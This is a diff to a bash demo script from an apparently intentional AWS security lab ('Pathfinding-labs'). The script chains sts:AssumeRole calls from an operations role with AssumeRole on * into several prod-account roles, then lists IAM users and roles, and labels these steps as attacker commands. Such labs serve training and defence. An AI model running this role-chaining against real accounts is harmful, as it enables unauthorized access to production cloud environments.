@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -37,9 +39,39 @@ echo -e "${BLUE}=== Pathfinding-labs Cross-Account Operations to Prod Role Assum
 echo "This demo shows how operations roles can assume roles in prod accounts."
 echo ""
 
+# Retrieve readonly credentials for observation steps
+cd ../../../../../..  # Navigate to root of terraform project
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+cd - > /dev/null
+
+# Credential switching helpers
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_starting_profile() {
+    unset AWS_ACCESS_KEY_ID
+    unset AWS_SECRET_ACCESS_KEY
+    unset AWS_SESSION_TOKEN
+}
+
+echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
+echo ""
+
 # --- Configuration ---
+# [OBSERVATION] Step 0: Get account IDs using profiles and readonly creds
 OPS_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-operations --query Account --output text)
-PROD_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-prod --query Account --output text)
+use_readonly_creds
+PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
 
 OPS_STARTING_USER_PROFILE="pl-pathfinding-starting-user-operations"
 OPS_ROLE_NAME="pl-x-account-ops-role-with-assume-role-star"
@@ -52,13 +84,13 @@ echo "Operations Account ID: $OPS_ACCOUNT_ID"
 echo "Prod Account ID: $PROD_ACCOUNT_ID"
 echo ""
 
-# --- Step 1: Assume Operations Role ---
+# [EXPLOIT] Step 2: Assume Operations Role
 echo -e "${YELLOW}Step 2: Assuming Operations Role with sts:AssumeRole on *${NC}"
 OPS_ROLE_ARN="arn:aws:iam::${OPS_ACCOUNT_ID}:role/${OPS_ROLE_NAME}"
 
 echo "Operations Role ARN: $OPS_ROLE_ARN"
 echo "Assuming operations role..."
-show_attack_cmd aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE""
 OPS_ASSUME_OUTPUT=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo" --profile "$OPS_STARTING_USER_PROFILE")
 export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
@@ -66,10 +98,11 @@ export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT" | jq -r '.Credentials.Sessi
 
 echo -e "${GREEN}✓ Successfully assumed operations role${NC}"
 
-echo ""
+
+# [OBSERVATION] Step 3: Verify operations role permissions (using assumed ops role creds)
 echo -e "${YELLOW}Step 3: Verifying Operations Role Permissions${NC}"
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
@@ -78,13 +111,13 @@ echo "The operations role has sts:AssumeRole permission on all resources (*)"
 echo -e "${RED}⚠️  This is a critical security vulnerability!${NC}"
 echo ""
 
-# --- Step 2: Assume Prod Role 1 (SecurityAudit) ---
+# [EXPLOIT] Step 4: Assume Prod Role 1 (SecurityAudit permissions)
 echo -e "${YELLOW}Step 4: Assuming Prod Role 1 (SecurityAudit permissions)${NC}"
 PROD_ROLE_1_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_1_NAME}"
 
 echo "Prod Role 1 ARN: $PROD_ROLE_1_ARN"
 echo "Assuming prod role 1 from operations role..."
-show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo""
 PROD_ASSUME_OUTPUT_1=$(aws sts assume-role --role-arn "$PROD_ROLE_1_ARN" --role-session-name "prod-role-1-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.SecretAccessKey')
@@ -92,16 +125,17 @@ export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_1" | jq -r '.Credentials.Se
 
 echo -e "${GREEN}✓ Successfully assumed prod role 1${NC}"
 
-echo ""
+
+# [OBSERVATION] Step 5: Verify prod role 1 access (using assumed prod role 1 creds)
 echo -e "${YELLOW}Step 5: Verifying Prod Role 1 Access${NC}"
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
 echo "Testing SecurityAudit permissions..."
 echo "Listing IAM users (SecurityAudit allows read-only access):"
-show_cmd aws iam list-users --max-items 5 --query 'Users[].UserName' --output text
+show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[].UserName' --output text"
 aws iam list-users --max-items 5 --query 'Users[].UserName' --output text
 
 echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access${NC}"
@@ -109,7 +143,8 @@ echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access${NC}"
 # Reset credentials for next test
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
-echo ""
+
+# [EXPLOIT] Step 6: Assume Prod Role 2 via re-assumed operations role
 echo -e "${YELLOW}Step 6: Assuming Prod Role 2 (Another SecurityAudit role)${NC}"
 # Re-assume operations role
 OPS_ASSUME_OUTPUT_2=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo-2" --profile "$OPS_STARTING_USER_PROFILE")
@@ -120,7 +155,7 @@ export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT_2" | jq -r '.Credentials.Ses
 PROD_ROLE_2_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_2_NAME}"
 echo "Prod Role 2 ARN: $PROD_ROLE_2_ARN"
 echo "Assuming prod role 2 from operations role..."
-show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo""
 PROD_ASSUME_OUTPUT_2=$(aws sts assume-role --role-arn "$PROD_ROLE_2_ARN" --role-session-name "prod-role-2-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.SecretAccessKey')
@@ -128,16 +163,17 @@ export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_2" | jq -r '.Credentials.Se
 
 echo -e "${GREEN}✓ Successfully assumed prod role 2${NC}"
 
-echo ""
+
+# [OBSERVATION] Step 7: Verify prod role 2 access (using assumed prod role 2 creds)
 echo -e "${YELLOW}Step 7: Verifying Prod Role 2 Access${NC}"
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
 echo "Testing SecurityAudit permissions on role 2..."
 echo "Listing IAM roles (SecurityAudit allows read-only access):"
-show_cmd aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text
+show_cmd "Attacker" "aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text"
 aws iam list-roles --max-items 5 --query 'Roles[].RoleName' --output text
 
 echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access via role 2${NC}"
@@ -145,7 +181,8 @@ echo -e "${GREEN}✓ Successfully demonstrated SecurityAudit access via role 2${
 # Reset credentials for next test
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
-echo ""
+
+# [EXPLOIT] Step 8: Demonstrate dangerous sts:AssumeRole on * - assume a third prod role
 echo -e "${YELLOW}Step 8: Demonstrating Dangerous sts:AssumeRole on *${NC}"
 # Re-assume operations role
 OPS_ASSUME_OUTPUT_3=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-demo-3" --profile "$OPS_STARTING_USER_PROFILE")
@@ -162,7 +199,7 @@ echo "Attempting to assume a role that trusts operations account..."
 PROD_ROLE_3_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/${PROD_ROLE_3_NAME}"
 echo "Prod Role 3 ARN: $PROD_ROLE_3_ARN"
 echo "Assuming prod role 3 from operations role..."
-show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo""
 PROD_ASSUME_OUTPUT_3=$(aws sts assume-role --role-arn "$PROD_ROLE_3_ARN" --role-session-name "prod-role-3-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.SecretAccessKey')
@@ -170,10 +207,11 @@ export AWS_SESSION_TOKEN=$(echo "$PROD_ASSUME_OUTPUT_3" | jq -r '.Credentials.Se
 
 echo -e "${GREEN}✓ Successfully assumed prod role 3${NC}"
 
-echo ""
+
+# [OBSERVATION] Step 9: Verify final role access (using assumed prod role 3 creds)
 echo -e "${YELLOW}Step 9: Verifying Final Role Access${NC}"
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
